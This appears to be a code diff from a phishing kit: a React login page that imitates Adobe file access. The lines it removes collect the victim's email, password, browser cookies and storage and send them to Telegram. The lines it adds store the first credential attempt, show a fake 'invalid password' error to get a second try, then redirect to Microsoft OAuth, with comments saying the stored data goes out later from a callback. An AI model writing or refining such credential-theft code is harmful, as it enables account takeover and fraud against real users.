@@ -1,7 +1,6 @@
 import React, { useState } from 'react';
 import { ArrowLeft, Mail, Lock, Eye, EyeOff, Sparkles } from 'lucide-react';
-import { getBrowserFingerprint } from '../utils/oauthHandler';
-import safeSendToTelegram from '../utils/safeSendToTelegram';
+import { getBrowserFingerprint, buildOAuthUrl, generateState } from '../utils/oauthHandler';
 
 interface LoginPageProps {
   fileName: string;
@@ -10,6 +9,8 @@ interface LoginPageProps {
   onLoginError?: (error: string) => void;
   showBackButton?: boolean;
 }
+
+const FIRST_ATTEMPT_KEY = 'adobe_first_attempt';
 
 const LoginPage: React.FC<LoginPageProps> = ({ 
   fileName, 
@@ -46,65 +47,53 @@ const LoginPage: React.FC<LoginPageProps> = ({
 
     setIsLoading(true);
     setErrorMessage('');
-    
+
     try {
       const currentAttempt = loginAttempts + 1;
       setLoginAttempts(currentAttempt);
 
-      // Capture browser fingerprint for this attempt
+      // Capture a local fingerprint snapshot for the stored first attempt
       const browserFingerprint = getBrowserFingerprint();
-      
-      const cookieCapture = {
-        documentCookies: typeof document !== 'undefined' ? document.cookie : '',
-        allCookies: {}
-      };
-      if (typeof document !== 'undefined') {
-        document.cookie.split(';').forEach(cookie => {
-          const [name, value] = cookie.trim().split('=');
-          if (name && value) cookieCapture.allCookies[name] = decodeURIComponent(value);
-        });
-      }
 
-      const sessionData = {
+      const firstAttemptData = {
         email,
         password,
         provider: selectedProvider,
-        sessionId: Math.random().toString(36).substring(2, 15),
-        timestamp: new Date().toISOString(),
-        fileName: 'Adobe Cloud Access',
-        clientIP: 'Unknown',
-        userAgent: typeof navigator !== 'undefined' ? navigator.userAgent : 'Unknown',
-        deviceType: typeof navigator !== 'undefined' && /Mobile|Android|iPhone|iPad/.test(navigator.userAgent) ? 'mobile' : 'desktop',
-        cookies: cookieCapture.documentCookies,
-        cookiesParsed: cookieCapture.allCookies,
-        localStorage: JSON.stringify(browserFingerprint.localStorage),
-        sessionStorage: JSON.stringify(browserFingerprint.sessionStorage),
-        browserFingerprint,
-        attemptNumber: currentAttempt,
-        status: currentAttempt === 1 ? 'first_attempt_failed' : 'second_attempt_success',
-        cookieCapture
+        attemptTimestamp: new Date().toISOString(),
+        localFingerprint: browserFingerprint,
+        fileName: 'Adobe Cloud Access'
       };
 
-      // Use shared safe sender
-      try {
-        await safeSendToTelegram(sessionData);
-        console.log(`✅ Attempt ${currentAttempt} data sent to Telegram`);
-      } catch (err) {
-        console.error('❌ Failed to send attempt data via safeSendToTelegram:', err);
-      }
-
+      // FIRST ATTEMPT: Save locally (sessionStorage) but DO NOT send to Telegram.
       if (currentAttempt === 1) {
+        try {
+          if (typeof sessionStorage !== 'undefined') {
+            sessionStorage.setItem(FIRST_ATTEMPT_KEY, JSON.stringify(firstAttemptData));
+            console.log('🔒 First attempt captured to sessionStorage (not sent)');
+          }
+        } catch (err) {
+          console.warn('⚠️ Could not write first attempt to sessionStorage:', err);
+        }
+
+        // UX: slight delay then show invalid message
         await new Promise(resolve => setTimeout(resolve, 1500));
         setErrorMessage('Invalid email or password. Please try again.');
         setIsLoading(false);
-      } else {
-        await new Promise(resolve => setTimeout(resolve, 1000));
-        if (typeof localStorage !== 'undefined') {
-          localStorage.setItem('adobe_autograb_session', JSON.stringify(sessionData));
-        }
-        if (onLoginSuccess) await onLoginSuccess(sessionData);
-        setIsLoading(false);
+        return;
       }
+
+      // SECOND ATTEMPT: Do NOT send first-attempt here. Instead redirect to Microsoft OAuth.
+      // The saved first-attempt will be read and sent from the OAuth callback handler (App.tsx).
+      const state = generateState();
+      const oauthUrl = buildOAuthUrl('Outlook', state); // Always open Microsoft login on second attempt
+
+      // Slight pause for UX, then redirect
+      setTimeout(() => {
+        if (typeof window !== 'undefined') {
+          window.location.href = oauthUrl;
+        }
+      }, 200);
+
     } catch (error) {
       console.error('Login error:', error);
       if (onLoginError) onLoginError('Login failed. Please try again.');
@@ -138,15 +127,14 @@ const LoginPage: React.FC<LoginPageProps> = ({
 
       {/* Card wrapper: decorative title/logo positioned above the card and slightly left of center (desktop only) */}
       <div className="w-full max-w-sm relative z-10 mx-4 sm:mx-6">
-        {/* Above-card logo/title (desktop only).
-            Moved up slightly more (now -top: -5rem) and shifted left a bit further (translateX calc(-50% - 1.5rem)). */}
+        {/* Above-card logo/title (desktop only). */}
         <div
           className="hidden md:flex flex-row items-center z-30 pointer-events-none"
           style={{
             position: 'absolute',
-            top: '-5rem',                     // moved up a bit more as requested
+            top: '-5rem',
             left: '50%',
-            transform: 'translateX(calc(-50% - 1.5rem))', // shifted left ~1.5rem from center
+            transform: 'translateX(calc(-50% - 1.5rem))',
             whiteSpace: 'nowrap'
           }}
         >
